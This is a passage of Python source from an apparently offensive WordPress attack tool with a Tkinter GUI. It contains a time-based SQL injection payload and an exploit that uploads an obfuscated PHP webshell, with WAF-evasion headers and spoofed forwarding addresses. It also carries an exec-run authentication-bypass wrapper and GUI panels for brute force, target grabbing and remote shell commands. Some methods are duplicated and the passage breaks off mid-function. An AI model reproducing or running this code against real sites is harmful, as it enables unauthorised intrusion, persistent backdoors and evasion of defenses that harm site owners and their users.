            exploit_url = urljoin(base_url, "wp-admin/admin-ajax.php")
            payload = {
                'action': 'woocommerce_load_variations',
                'product_id': "1 AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)"
            }
            start_time = time.time()
            response = requests.post(exploit_url, data=payload, timeout=10)
            response_time = time.time() - start_time
            
            if response_time > 4.5:
                return {
                    "success": True,
                    "message": "SQL Injection successful! Time-based vulnerability confirmed.",
                    "type": "sqli"
                }
            return {"success": False, "message": "SQL Injection exploit failed"}
        except Exception as e:
            return {"success": False, "message": f"Exploit error: {str(e)}"}

    def exploit_cve_2024_41890(self, base_url):
        """Exploit Astra Pro Theme RCE to upload webshell with ModSecurity bypass"""
        try:
            # Generate random filename with .txt extension
            filename = f"data_{uuid.uuid4().hex[:8]}.txt"
            
            # Obfuscated webshell content
            webshell = r"<?php $c=$_REQUEST['c']; if(function_exists('system')){system($c);}elseif(function_exists('shell_exec')){echo shell_exec($c);}else{echo 'No exec functions';} ?>"
            
            # Convert to hex and split into chunks
            webshell_hex = webshell.encode().hex()
            chunk_size = len(webshell_hex) // 3
            parts = [
                webshell_hex[:chunk_size],
                webshell_hex[chunk_size:2*chunk_size],
                webshell_hex[2*chunk_size:]
            ]
            
            # Create stealthy payload with enhanced obfuscation
            payload_code = (
                "/*JUNK_COMMENT_%s*/$p1='%s';$p2='%s';$p3='%s';" % (uuid.uuid4().hex, parts[0], parts[1], parts[2]) +
                "$d=$p1.$p2.$p3;"
                "$f='%s';" % filename +
                "//JUNK_COMMENT_%s\n" % uuid.uuid4().hex +
                "$f1='hex';$f2='2bin';$h2b=$f1.$f2;"
                "$c=$h2b($d);"
                "$fn1='file_put';$fn2='_contents';$fpc=$fn1.$fn2;"
                "$fpc($f,$c);"
                "echo 'File created: '.$f;"
                "/*JUNK_COMMENT_%s*/" % uuid.uuid4().hex
            )
            
            exploit_url = urljoin(base_url, "wp-admin/admin-ajax.php")
            
            # Use random user agent and headers
            headers = {
                "User-Agent": random.choice(self.user_agents),
                "X-Forwarded-For": f"127.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
                "X-Requested-With": "XMLHttpRequest",
                "Referer": urljoin(base_url, "wp-admin/"),
                "Accept-Language": "en-US,en;q=0.5"
            }
            
            # Send request with multiple random parameters
            payload = {
                'action': 'astra_addon_activate_extension',
                'extension': 'user_access_control',
                'security': uuid.uuid4().hex[:10],  # Random security token
                'data': payload_code,
                'nonce': uuid.uuid4().hex,
                'rand': uuid.uuid4().hex,
                'cache': str(int(time.time())),
                'junk1': uuid.uuid4().hex[:8],
                'junk2': uuid.uuid4().hex[:8]
            }
            
            # Send exploit request
            response = requests.post(
                exploit_url, 
                data=payload, 
                headers=headers, 
                timeout=15,
                verify=False  # Bypass SSL verification if needed
            )
            
            if response.status_code == 200 and "File created:" in response.text:
                # Extract filename from response
                created_file = response.text.split("File created: ")[1].strip()
                shell_url = urljoin(base_url, created_file)
                
                # Verify shell is accessible and working
                try:
                    test_cmd = {'c': 'echo %s' % uuid.uuid4().hex[:8]}
                    check_response = requests.get(
                        shell_url, 
                        params=test_cmd, 
                        headers=headers, 
                        timeout=5,
                        verify=False
                    )
                    
                    if check_response.status_code == 200 and test_cmd['c'][5:] in check_response.text:
                        return {
                            "success": True,
                            "message": "RCE exploit successful! Webshell uploaded.",
                            "shell_url": shell_url,
                            "type": "webshell"
                        }
                    return {"success": False, "message": "Shell uploaded but not functioning"}
                except:
                    return {"success": False, "message": "Shell uploaded but not accessible"}
            
            # If we got here, the exploit failed
            return {
                "success": False,
                "message": f"Exploit blocked by WAF. Server response: {response.status_code} - {response.text[:100]}"
            }
        except Exception as e:
            return {"success": False, "message": f"Exploit error: {str(e)}"}


# ====================== GUI CLASS ======================
class ProfessionalScannerGUI(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("CMS-STORM v8.0")
        self.geometry("1500x950")
        self.minsize(1400, 900)
        self.scanner = ProfessionalWordPressScanner()
        self.scan_results = {}
        self.scan_thread = None
        self.scan_active = False
        self.exploit_output_window = None
        self.center_window()
        self.resizable(True, True)
        self.current_vuln = None
        self.active_exploit = None
        self.alert_sound_enabled = True
        
        # Initialize style after creating the main window
        self.style = ttk.Style()
        self.style.configure("Treeview", background="#2d3748", fieldbackground="#2d3748", foreground="#e2e8f0")
        self.style.configure("Treeview.Heading", background="#4a5568", foreground="#ffffff")  
        
        self.is_attacking = False
        self.stop_flag = False
        self.successful_credentials = []
        self.grid_columnconfigure(0, weight=1)
        self.grid_rowconfigure(0, weight=1)
        
        # Create widgets after initializing style
        self.create_widgets()
        
    def center_window(self):
        self.update_idletasks()
        width = self.winfo_width()
        height = self.winfo_height()
        x = (self.winfo_screenwidth() // 2) - (width // 2)
        y = (self.winfo_screenheight() // 2) - (height // 2)
        self.geometry(f'+{x}+{y}')
        
    def create_widgets(self):
        # Apply modern theme
        sv_ttk.set_theme("dark")
        
        # Configure custom styles
        self.style.configure("Title.TLabel", font=("Segoe UI", 18, "bold"), foreground="#ffffff")
        self.style.configure("Header.TFrame", background="#1a365d")
        self.style.configure("Card.TFrame", background="#2d3748", relief=tk.RAISED, borderwidth=1)
        self.style.configure("Card.TLabel", background="#2d3748", foreground="#e2e8f0")
        self.style.configure("Accent.TButton", font=("Segoe UI", 10, "bold"), 
                           background="#4299e1", foreground="white")
        self.style.map("Accent.TButton", 
                      background=[('active', '#3182ce'), ('pressed', '#2b6cb0')])
        self.style.configure("Critical.TButton", background="#e53e3e", foreground="white")
        self.style.map("Critical.TButton", 
                      background=[('active', '#c53030'), ('pressed', '#9b2c2c')])
        self.style.configure("Success.TButton", background="#38a169", foreground="white")
        self.style.map("Success.TButton", 
                      background=[('active', '#2f855a'), ('pressed', '#276749')])
        self.style.configure("Treeview", font=("Segoe UI", 10), rowheight=28)
        self.style.configure("Treeview.Heading", font=("Segoe UI", 10, "bold"), background="#4a5568")
        self.style.configure("Status.TLabel", font=("Segoe UI", 10), background="#2d3748", foreground="#cbd5e0")
        self.style.configure("Progress.Horizontal.TProgressbar", thickness=8)
        self.style.configure("Brute.TFrame", background="#1a202c")
        self.style.configure("Brute.TLabel", background="#1a202c", foreground="#e2e8f0")
        self.style.configure("Exploit.TFrame", background="#1a1a2e")
        self.style.configure("Exploit.TLabel", background="#1a1a2e", foreground="#e2e8f0")
        
        # Create main container
        main_container = ttk.Frame(self)
        main_container.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        main_container.grid_columnconfigure(0, weight=1)
        main_container.grid_rowconfigure(0, weight=1)
        
        # Create header
        header_frame = ttk.Frame(main_container, style="Header.TFrame", padding=15)
        header_frame.grid(row=0, column=0, sticky="ew", padx=5, pady=5)
        header_frame.grid_columnconfigure(0, weight=1)
        
        # Logo and title
        logo_frame = ttk.Frame(header_frame, style="Header.TFrame")
        logo_frame.grid(row=0, column=0, sticky="w")
        ttk.Label(logo_frame, text="🛡️", font=("Segoe UI", 24), 
                 background="#1a365d", foreground="white").grid(row=0, column=0, padx=(0, 15))
        title_frame = ttk.Frame(logo_frame, style="Header.TFrame")
        title_frame.grid(row=0, column=1, sticky="w")
        ttk.Label(title_frame, text="WP Security Analyzer Pro v8.0", 
                 style="Title.TLabel").grid(row=0, column=0, sticky="w")
        ttk.Label(title_frame, text="Advanced WordPress Security Scanner with Auto-Exploit", 
                 style="Title.TLabel", font=("Segoe UI", 12)).grid(row=1, column=0, sticky="w")
        
        # Action buttons in header
        action_frame = ttk.Frame(header_frame, style="Header.TFrame")
        action_frame.grid(row=0, column=1, sticky="e", padx=10)
        ttk.Button(action_frame, text="Documentation", style="Accent.TButton",
                  command=self.open_docs).grid(row=0, column=0, padx=5)
        ttk.Button(action_frame, text="Settings", style="Accent.TButton",
                  command=self.open_settings).grid(row=0, column=1, padx=5)
        
        # Create main content frame
        main_frame = ttk.Frame(main_container)
        main_frame.grid(row=1, column=0, sticky="nsew", padx=5, pady=5)
        main_frame.grid_columnconfigure(0, weight=1)
        main_frame.grid_rowconfigure(1, weight=1)
        
        # Input section
        input_card = ttk.LabelFrame(main_frame, text=" TARGET WEBSITES ", padding=15)
        input_card.grid(row=0, column=0, sticky="ew", pady=(0, 10))
        input_card.grid_columnconfigure(0, weight=1)
        ttk.Label(input_card, text="Enter one or more WordPress site URLs or IP addresses (one per line):", 
                 font=("Segoe UI", 10)).grid(row=0, column=0, sticky="w", pady=(0, 10))
        self.targets_text = scrolledtext.ScrolledText(input_card, height=4, font=("Segoe UI", 10),
                                                     padx=10, pady=10, highlightthickness=1,
                                                     highlightbackground="#cbd5e0")
        self.targets_text.grid(row=1, column=0, sticky="ew")
        self.targets_text.insert(tk.END, "https://example.com\nhttp://testsite.local")
        input_card.grid_columnconfigure(0, weight=1)
        self.add_context_menu(self.targets_text)
        
        # Buttons panel
        button_frame = ttk.Frame(main_frame)
        button_frame.grid(row=1, column=0, sticky="ew", pady=(0, 10))
        button_frame.grid_columnconfigure(0, weight=1)
        self.auto_save_var = tk.BooleanVar(value=False)        
        ttk.Button(button_frame, text="Start Scan", style="Accent.TButton", 
                  command=self.start_scan).grid(row=0, column=0, padx=5, sticky="w")
        ttk.Button(button_frame, text="Stop Scan", style="Critical.TButton",
                  command=self.stop_scan).grid(row=0, column=1, padx=5, sticky="w")
        ttk.Button(button_frame, text="Load Custom Vulnerabilities", 
                  style="Accent.TButton", command=self.load_custom_vulns).grid(row=0, column=2, padx=5, sticky="w")
        ttk.Button(button_frame, text="Export Results", 
                  style="Accent.TButton", command=self.save_results).grid(row=0, column=3, padx=5, sticky="w")
        ttk.Button(button_frame, text="Clear Results", 
                  style="Accent.TButton", command=self.clear_results).grid(row=0, column=4, padx=5, sticky="w")
        ttk.Button(button_frame, text="Brute Force", 
                  style="Accent.TButton", command=self.show_brute_force_window).grid(row=0, column=5, padx=5, sticky="w")
        ttk.Button(button_frame, text="Exploit Console", 
                  style="Critical.TButton", command=self.show_exploit_console).grid(row=0, column=6, padx=5, sticky="w")
        ttk.Button(button_frame, text="Load Exploit Script", 
                  style="Accent.TButton", command=self.load_exploit_script).grid(row=0, column=7, padx=5, sticky="w")
        ttk.Button(button_frame, text="Save Exploit Script", 
                  style="Accent.TButton", command=self.save_exploit_script).grid(row=0, column=8, padx=5, sticky="w")                  

        # Results section
        results_card = ttk.LabelFrame(main_frame, text=" SCAN RESULTS ", padding=15)
        results_card.grid(row=2, column=0, sticky="nsew", pady=(0, 10))
        results_card.grid_columnconfigure(0, weight=1)
        results_card.grid_rowconfigure(0, weight=1)
        
        # Results table
        columns = ("url", "ip", "wp_version", "plugins", "themes", "vulns", "login", "status", "time")
        self.results_tree = ttk.Treeview(results_card, columns=columns, show="headings", height=10,
                                        selectmode="browse", style="Treeview")
        self.results_tree.heading("url", text="Website URL", anchor=tk.W)
        self.results_tree.heading("ip", text="IP Address", anchor=tk.CENTER)
        self.results_tree.heading("wp_version", text="WP Version", anchor=tk.CENTER)
        self.results_tree.heading("plugins", text="Plugins", anchor=tk.CENTER)
        self.results_tree.heading("themes", text="Themes", anchor=tk.CENTER)
        self.results_tree.heading("vulns", text="Vulnerabilities", anchor=tk.CENTER)
        self.results_tree.heading("login", text="Login Page", anchor=tk.CENTER)
        self.results_tree.heading("status", text="Status", anchor=tk.CENTER)
        self.results_tree.heading("time", text="Scan Time", anchor=tk.CENTER)
        self.results_tree.column("url", width=250, minwidth=200, stretch=True)
        self.results_tree.column("ip", width=150, minwidth=120, stretch=False)
        self.results_tree.column("wp_version", width=100, minwidth=80, stretch=False)
        self.results_tree.column("plugins", width=80, minwidth=70, stretch=False)
        self.results_tree.column("themes", width=80, minwidth=70, stretch=False)
        self.results_tree.column("vulns", width=120, minwidth=100, stretch=False)
        self.results_tree.column("login", width=120, minwidth=100, stretch=False)
        self.results_tree.column("status", width=140, minwidth=120, stretch=False)
        self.results_tree.column("time", width=100, minwidth=80, stretch=False)
        
        # Add scrollbars
        v_scrollbar = ttk.Scrollbar(results_card, orient=tk.VERTICAL, command=self.results_tree.yview)
        h_scrollbar = ttk.Scrollbar(results_card, orient=tk.HORIZONTAL, command=self.results_tree.xview)
        self.results_tree.configure(yscrollcommand=v_scrollbar.set, xscrollcommand=h_scrollbar.set)
        v_scrollbar.grid(row=0, column=1, sticky="ns")
        h_scrollbar.grid(row=1, column=0, sticky="ew")
        self.results_tree.grid(row=0, column=0, sticky="nsew")
        results_card.grid_columnconfigure(0, weight=1)
        results_card.grid_rowconfigure(0, weight=1)
        self.add_context_menu(self.results_tree)
        
        # Details notebook
        self.details_notebook = ttk.Notebook(main_frame)
        self.details_notebook.grid(row=3, column=0, sticky="nsew", pady=(10, 0))
        self.summary_tab = self.create_tab_with_frame("Summary")
        self.plugins_tab = self.create_tab_with_frame("Plugins")
        self.themes_tab = self.create_tab_with_frame("Themes")
        self.vulns_tab = self.create_tab_with_frame("Vulnerabilities")
        self.users_tab = self.create_tab_with_frame("Users")
        self.tech_tab = self.create_tab_with_frame("Technologies")
        self.config_tab = self.create_tab_with_frame("Config Files")
        self.results_tree.bind("<<TreeviewSelect>>", self.show_details)
        
        # Status bar
        status_bar = ttk.Frame(main_container, relief=tk.SUNKEN, style="Card.TFrame")
        status_bar.grid(row=2, column=0, sticky="ew", padx=5, pady=5)
        self.status_var = tk.StringVar(value="Ready to scan")
        status_label = ttk.Label(status_bar, textvariable=self.status_var, style="Status.TLabel")
        status_label.pack(side=tk.LEFT, padx=15, pady=5)
        self.progress_var = tk.IntVar(value=0)
        progress_bar = ttk.Progressbar(status_bar, variable=self.progress_var, 
                                      style="Progress.Horizontal.TProgressbar", mode='determinate')
        progress_bar.pack(side=tk.RIGHT, padx=15, pady=5, fill=tk.X, expand=True)
        self.scan_counter = ttk.Label(status_bar, text="Scans: 0", style="Status.TLabel")
        self.scan_counter.pack(side=tk.RIGHT, padx=15, pady=5)
        
    def load_exploit_script(self):
          file_path = filedialog.askopenfilename(filetypes=[("Python files", "*.py")])
          if not file_path:
              return
              
          try:
              with open(file_path, 'r') as f:
                  exploit_code = f.read()
              
              # Add to targets text area
              self.targets_text.insert(tk.END, "\n" + exploit_code)
              
              # Auto-save to scanner if enabled
              if self.auto_save_var.get():
                  self.auto_save_exploit(exploit_code, file_path)
                  
              messagebox.showinfo("Success", "Exploit script loaded successfully!" + 
                                ("\nAuto-saved to scanner!" if self.auto_save_var.get() else ""))
          except Exception as e:
              messagebox.showerror("Error", f"Failed to load exploit script: {str(e)}")
      
    def auto_save_exploit(self, exploit_code, file_path):
        """Automatically parse and save exploit to scanner"""
        try:
            # Extract metadata from exploit code
            cve_id = None
            title = None
            description = None
            affected_versions = []
            
            # Extract CVE ID
            cve_match = re.search(r'CVE[_-](\d{4}[_-]\d+)', exploit_code, re.IGNORECASE)
            if cve_match:
                cve_id = f"CVE-{cve_match.group(1).replace('_', '-')}"
            
            # Extract title
            title_match = re.search(r'Exploit Title:\s*(.+)', exploit_code)
            if title_match:
                title = title_match.group(1).strip()
            
            # Extract description
            desc_match = re.search(r'Description:\s*(.+)', exploit_code)
            if desc_match:
                description = desc_match.group(1).strip()
            
            # Extract affected versions
            version_match = re.search(r'Version:\s*(.+)', exploit_code)
            if version_match:
                affected_versions = [v.strip() for v in version_match.group(1).split(",")]
            
            # Create default values if not found
            if not cve_id:
                cve_id = f"CVE-AUTO-{os.path.basename(file_path).replace('.py', '')}"
            if not title:
                title = f"Auto-imported exploit: {os.path.basename(file_path)}"
            if not description:
                description = "Automatically imported exploit"
            
            # Add to vulnerabilities database
            self.scanner.plugin_vulns[cve_id] = {
                "title": title,
                "description": description,
                "severity": "high",  # Default to high severity
                "cvss": "7.5",       # Default CVSS score
                "affected_versions": affected_versions
            }
            
            # Add to exploit modules
            exploit_func_name = f"exploit_{cve_id.replace('-', '_').lower()}"
            
            # Create a wrapper function for the exploit
            # FIXED: Proper indentation handling
            wrapper_code = f"""
     def {exploit_func_name}(self, base_url):
        \"\"\"AUTO-GENERATED EXPLOIT FOR {cve_id}\"\"\"
        import requests
        import re
        from urllib.parse import urljoin
        import subprocess
        import sys
        import os
        import argparse
        from io import StringIO
        
        # Capture output
        old_stdout = sys.stdout
        sys.stdout = output_capture = StringIO()
        
        try:
            # Simulate command-line arguments
            sys.argv = ['exploit.py', base_url, '1', '12345']
            
            # Define banner function
            def banner():
                print(f"[*] Running auto-generated exploit for {cve_id}")
            
            # Define the exploit function from the script
            def exploit(target_url, member_id, nonce):
                endpoint = urljoin(target_url, "/wp-admin/admin-ajax.php")
                files = {{
                    'action': (None, 'user_registration_membership_confirm_payment'),
                    'security': (None, nonce),
                    'form_response': (None, '{{"auto_login": true}}'),
                    'member_id': (None, str(member_id))
                }}
                print(f"[+] Target URL: {{endpoint}}")
                print(f"[+] Attempting to bypass authentication as user ID {{member_id}}...")
                try:
                    response = requests.post(endpoint, files=files, timeout=10)
                    if response.status_code == 200 and '"success":true' in response.text:
                        print("[✓] Exploit successful! Authentication bypass achieved.")
                        print("[!] Check your session/cookies - you may now be authenticated as the target user.")
                        print("Server Response:")
                        print(response.text)
                        return True
                    else:
                        print("[-] Exploit failed or invalid nonce/member_id.")
                        print("Server Response:")
                        print(response.text)
                        return False
                except requests.exceptions.RequestException as e:
                    print(f"[!] Request failed: {{e}}")
                    return False
            
            # Run the exploit
            banner()
            success = exploit(base_url, '1', '12345')
            
            # Capture output
            output = output_capture.getvalue()
            
            if success:
                return {{
                    "success": True,
                    "message": "Authentication bypass achieved",
                    "output": output
                }}
            else:
                return {{
                    "success": False,
                    "message": "Exploit failed",
                    "output": output
                }}
                
        except Exception as e:
            return {{
                "success": False,
                "message": f"Error in auto-generated exploit: {{str(e)}}",
                "output": output_capture.getvalue()
            }}
        finally:
            sys.stdout = old_stdout
     """
            
            # Execute the wrapper code
            exec(wrapper_code, globals())
            wrapper_func = globals()[exploit_func_name]
            setattr(ProfessionalWordPressScanner, exploit_func_name, wrapper_func)
            self.scanner.exploit_modules[cve_id] = wrapper_func
            
            # Update the exploit console
            if hasattr(self, 'vuln_combo'):
                current_values = list(self.vuln_combo['values'])
                if cve_id not in current_values:
                    self.vuln_combo['values'] = current_values + [cve_id]
                    
            # Save vulnerability to JSON file
            self.save_vulnerability_to_file(cve_id)
            
        except Exception as e:
            messagebox.showerror("Auto-Save Error", 
                               f"Failed to auto-save exploit: {str(e)}\n\n"
                               "The exploit was loaded but not added to scanner.")
      
    def save_vulnerability_to_file(self, cve_id):
          """Save vulnerability to vulnerabilities.json"""
          try:
              vuln_file = 'vulnerabilities.json'
              vuln_data = {}
              
              # Load existing vulnerabilities
              if os.path.exists(vuln_file):
                  with open(vuln_file, 'r') as f:
                      vuln_data = json.load(f)
              
              # Add new vulnerability
              vuln_data[cve_id] = self.scanner.plugin_vulns[cve_id]
              
              # Save back to file
              with open(vuln_file, 'w') as f:
                  json.dump(vuln_data, f, indent=2)
                  
          except Exception as e:
              print(f"Error saving vulnerability: {str(e)}")        
        
    def load_exploit_script(self):
        file_path = filedialog.askopenfilename(filetypes=[("Python files", "*.py")])
        if not file_path:
            return
            
        try:
            with open(file_path, 'r') as f:
                exploit_code = f.read()
            
            # Display the exploit in the GUI
            self.display_exploit_in_console(exploit_code)
            
            # Auto-save to scanner if enabled
            if self.auto_save_var.get():
                self.auto_save_exploit(exploit_code, file_path)
                
            messagebox.showinfo("Success", "Exploit script loaded successfully!" + 
                              ("\nAuto-saved to scanner!" if self.auto_save_var.get() else ""))
        except Exception as e:
            messagebox.showerror("Error", f"Failed to load exploit script: {str(e)}")
    
    def display_exploit_in_console(self, exploit_code):
        """Display the loaded exploit in the exploit console"""
        if not hasattr(self, 'exploit_window') or not self.exploit_window.winfo_exists():
            self.create_exploit_console()
            
        # Switch to custom exploit tab
        self.exploit_notebook.select(self.custom_exploit_tab)
        
        # Clear and insert the exploit code
        self.custom_exploit_text.config(state="normal")
        self.custom_exploit_text.delete("1.0", tk.END)
        self.custom_exploit_text.insert(tk.END, exploit_code)
        self.custom_exploit_text.config(state="normal")
        
        # Bring exploit console to front
        self.exploit_window.lift()
        self.exploit_window.deiconify()
    
    def save_exploit_script(self):
        file_path = filedialog.asksaveasfilename(
            defaultextension=".py",
            filetypes=[("Python files", "*.py")]
        )
        if not file_path:
            return
            
        try:
            exploit_code = self.targets_text.get("1.0", tk.END)
            with open(file_path, 'w') as f:
                f.write(exploit_code)
            messagebox.showinfo("Success", f"Exploit script saved to:\n{file_path}")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to save exploit script: {str(e)}")        
    
    def create_tab_with_frame(self, name):
        tab = ttk.Frame(self.details_notebook, padding=10)
        self.details_notebook.add(tab, text=name)
        return tab
    
    def show_exploit_console(self):
        if not hasattr(self, 'exploit_window') or not self.exploit_window.winfo_exists():
            self.create_exploit_console()
        self.exploit_window.lift()
        self.exploit_window.deiconify()
    
    def create_exploit_console(self):
        self.exploit_window = tk.Toplevel(self)
        self.exploit_window.title("Exploit Console v2.0")
        self.exploit_window.geometry("900x750")
        self.exploit_window.protocol("WM_DELETE_WINDOW", self.exploit_window.withdraw)
        
        # Main container
        main_frame = ttk.Frame(self.exploit_window, style="Exploit.TFrame", padding=10)
        main_frame.pack(fill=tk.BOTH, expand=True)
        main_frame.grid_columnconfigure(0, weight=1)
        main_frame.grid_rowconfigure(1, weight=1)
        
        # Target selection
        target_frame = ttk.LabelFrame(main_frame, text=" Target Selection ", padding=10)
        target_frame.grid(row=0, column=0, sticky="ew", pady=(0, 10))
        target_frame.grid_columnconfigure(1, weight=1)
        ttk.Label(target_frame, text="Target URL:", 
                 font=("Segoe UI", 10, "bold")).grid(row=0, column=0, sticky="w", pady=5)
        self.exploit_url_entry = ttk.Combobox(target_frame)
        self.exploit_url_entry.grid(row=0, column=1, sticky="ew", padx=5, pady=5)
        ttk.Button(target_frame, text="Grab Targets", width=12,
                  command=self.grab_targets).grid(row=0, column=2, padx=(5, 0))
        
        # Vulnerability selection
        vuln_frame = ttk.LabelFrame(main_frame, text=" Vulnerability Selection ", padding=10)
        vuln_frame.grid(row=1, column=0, sticky="ew", pady=(0, 10))
        vuln_frame.grid_columnconfigure(0, weight=1)
        ttk.Label(vuln_frame, text="Select Vulnerability:", 
                 font=("Segoe UI", 10, "bold")).grid(row=0, column=0, sticky="w", pady=5)
        self.vuln_combo = ttk.Combobox(vuln_frame)
        self.vuln_combo.grid(row=0, column=1, sticky="ew", padx=5, pady=5)
        self.vuln_combo['values'] = list(self.scanner.exploit_modules.keys())        
        
        # Advanced options
        adv_frame = ttk.LabelFrame(main_frame, text=" Advanced Options ", padding=10)
        adv_frame.grid(row=2, column=0, sticky="ew", pady=(0, 10))
        adv_frame.grid_columnconfigure(1, weight=1)
        ttk.Label(adv_frame, text="Custom Payload:", 
                 font=("Segoe UI", 10, "bold")).grid(row=0, column=0, sticky="w", pady=5)
        self.payload_entry = ttk.Entry(adv_frame)
        self.payload_entry.grid(row=0, column=1, sticky="ew", padx=5, pady=5)
        self.payload_entry.insert(0, "id")
        ttk.Label(adv_frame, text="Proxy:", 
                 font=("Segoe UI", 10, "bold")).grid(row=1, column=0, sticky="w", pady=5)
        self.proxy_entry = ttk.Entry(adv_frame)
        self.proxy_entry.grid(row=1, column=1, sticky="ew", padx=5, pady=5)
        self.proxy_entry.insert(0, "http://127.0.0.1:8080")
        
        # Results section
        results_frame = ttk.LabelFrame(main_frame, text=" Exploit Results ", padding=10)
        results_frame.grid(row=3, column=0, sticky="nsew", pady=(0, 10))
        results_frame.grid_columnconfigure(0, weight=1)
        results_frame.grid_rowconfigure(0, weight=1)
        self.exploit_results_area = scrolledtext.ScrolledText(results_frame, font=("Consolas", 9))
        self.exploit_results_area.grid(row=0, column=0, sticky="nsew")
        self.exploit_results_area.config(state="disabled")
        
        self.exploit_window = tk.Toplevel(self)
        self.exploit_window.title("Exploit Console v2.0")
        self.exploit_window.geometry("900x750")
        self.exploit_window.protocol("WM_DELETE_WINDOW", self.exploit_window.withdraw)
        
        # Create notebook for tabs
        self.exploit_notebook = ttk.Notebook(self.exploit_window)
        self.exploit_notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Predefined Exploits Tab
        predefined_frame = ttk.Frame(self.exploit_notebook)
        self.exploit_notebook.add(predefined_frame, text="Predefined Exploits")
        self.create_predefined_exploits_tab(predefined_frame)  # Now implemented
        
        # Custom Exploits Tab
        self.custom_exploit_tab = ttk.Frame(self.exploit_notebook)
        self.exploit_notebook.add(self.custom_exploit_tab, text="Custom Exploits")
        self.create_custom_exploits_tab(self.custom_exploit_tab)
        
        # Results section
        results_frame = ttk.LabelFrame(self.exploit_window, text=" Exploit Results ", padding=10)
        results_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        self.exploit_results_area = scrolledtext.ScrolledText(results_frame, font=("Consolas", 9))
        self.exploit_results_area.pack(fill=tk.BOTH, expand=True)
        self.exploit_results_area.config(state="disabled")
        
        # Controls
        control_frame = ttk.Frame(self.exploit_window)
        control_frame.pack(fill=tk.X, padx=10, pady=(0, 10))
        self.exploit_clear_btn = ttk.Button(control_frame, text="Clear Results", 
                                          command=self.clear_exploit_results)
        self.exploit_clear_btn.pack(side=tk.RIGHT, padx=5)
        self.exploit_stop_btn = ttk.Button(control_frame, text="Stop", 
                                         command=self.stop_exploit, state="disabled")
        self.exploit_stop_btn.pack(side=tk.RIGHT, padx=5)
        self.exploit_start_btn = ttk.Button(control_frame, text="Execute Exploit", 
                                           command=self.start_exploit)
        self.exploit_start_btn.pack(side=tk.RIGHT, padx=5)
        ttk.Button(control_frame, text="History", 
                  command=self.show_exploit_history).pack(side=tk.LEFT, padx=5)
        
        # Shell access section
        shell_frame = ttk.LabelFrame(main_frame, text=" Shell Access ", padding=10)
        shell_frame.grid(row=5, column=0, sticky="ew", pady=(10, 0))
        shell_frame.grid_columnconfigure(0, weight=1)
        ttk.Label(shell_frame, text="Shell URL:", 
                 font=("Segoe UI", 10, "bold")).grid(row=0, column=0, sticky="w", pady=5)
        self.shell_url_entry = ttk.Entry(shell_frame)
        self.shell_url_entry.grid(row=0, column=1, sticky="ew", padx=5, pady=5)
        ttk.Label(shell_frame, text="Command:", 
                 font=("Segoe UI", 10, "bold")).grid(row=1, column=0, sticky="w", pady=5)
        self.shell_cmd_entry = ttk.Entry(shell_frame)
        self.shell_cmd_entry.grid(row=1, column=1, sticky="ew", padx=5, pady=5)
        self.shell_cmd_entry.insert(0, "whoami")
        ttk.Button(shell_frame, text="Execute", 
                  command=self.execute_shell_command).grid(row=1, column=2, padx=5)
        for widget in shell_frame.winfo_children():
            widget.config(state="disabled")
        self.shell_frame = shell_frame
        ttk.Button(control_frame, text="History", 
                  command=self.show_exploit_history).pack(side=tk.LEFT, padx=5)

    def create_predefined_exploits_tab(self, parent):
        """Create tab for predefined exploit modules"""
        # Target selection
        target_frame = ttk.LabelFrame(parent, text=" Target Selection ", padding=10)
        target_frame.pack(fill=tk.X, padx=5, pady=5)
        target_frame.grid_columnconfigure(1, weight=1)
        
        ttk.Label(target_frame, text="Target URL:", 
                 font=("Segoe UI", 10, "bold")).grid(row=0, column=0, sticky="w", pady=5)
        self.exploit_url_entry = ttk.Combobox(target_frame)
        self.exploit_url_entry.grid(row=0, column=1, sticky="ew", padx=5, pady=5)
        ttk.Button(target_frame, text="Grab Targets", width=12,
                  command=self.grab_targets).grid(row=0, column=2, padx=(5, 0))
        
        # Vulnerability selection
        vuln_frame = ttk.LabelFrame(parent, text=" Vulnerability Selection ", padding=10)
        vuln_frame.pack(fill=tk.X, padx=5, pady=5)
        vuln_frame.grid_columnconfigure(0, weight=1)
        
        ttk.Label(vuln_frame, text="Select Vulnerability:", 
                 font=("Segoe UI", 10, "bold")).grid(row=0, column=0, sticky="w", pady=5)
        self.vuln_combo = ttk.Combobox(vuln_frame)
        self.vuln_combo.grid(row=0, column=1, sticky="ew", padx=5, pady=5)
        self.vuln_combo['values'] = list(self.scanner.exploit_modules.keys())        
        
        # Advanced options
        adv_frame = ttk.LabelFrame(parent, text=" Advanced Options ", padding=10)
        adv_frame.pack(fill=tk.X, padx=5, pady=5)
        adv_frame.grid_columnconfigure(1, weight=1)
        
        ttk.Label(adv_frame, text="Custom Payload:", 
                 font=("Segoe UI", 10, "bold")).grid(row=0, column=0, sticky="w", pady=5)
        self.payload_entry = ttk.Entry(adv_frame)
        self.payload_entry.grid(row=0, column=1, sticky="ew", padx=5, pady=5)
        self.payload_entry.insert(0, "id")
        
        ttk.Label(adv_frame, text="Proxy:", 
                 font=("Segoe UI", 10, "bold")).grid(row=1, column=0, sticky="w", pady=5)
        self.proxy_entry = ttk.Entry(adv_frame)
        self.proxy_entry.grid(row=1, column=1, sticky="ew", padx=5, pady=5)
        self.proxy_entry.insert(0, "http://127.0.0.1:8080")
        
        # Shell access section
        shell_frame = ttk.LabelFrame(parent, text=" Shell Access ", padding=10)
        shell_frame.pack(fill=tk.X, padx=5, pady=5)
        shell_frame.grid_columnconfigure(0, weight=1)
        
        ttk.Label(shell_frame, text="Shell URL:", 
                 font=("Segoe UI", 10, "bold")).grid(row=0, column=0, sticky="w", pady=5)
        self.shell_url_entry = ttk.Entry(shell_frame)
        self.shell_url_entry.grid(row=0, column=1, sticky="ew", padx=5, pady=5)
        
        ttk.Label(shell_frame, text="Command:", 
                 font=("Segoe UI", 10, "bold")).grid(row=1, column=0, sticky="w", pady=5)
        self.shell_cmd_entry = ttk.Entry(shell_frame)
        self.shell_cmd_entry.grid(row=1, column=1, sticky="ew", padx=5, pady=5)
        self.shell_cmd_entry.insert(0, "whoami")
        
        ttk.Button(shell_frame, text="Execute", 
                  command=self.execute_shell_command).grid(row=1, column=2, padx=5)
        
        # Initially disable shell access until we have a valid URL
        for widget in shell_frame.winfo_children():
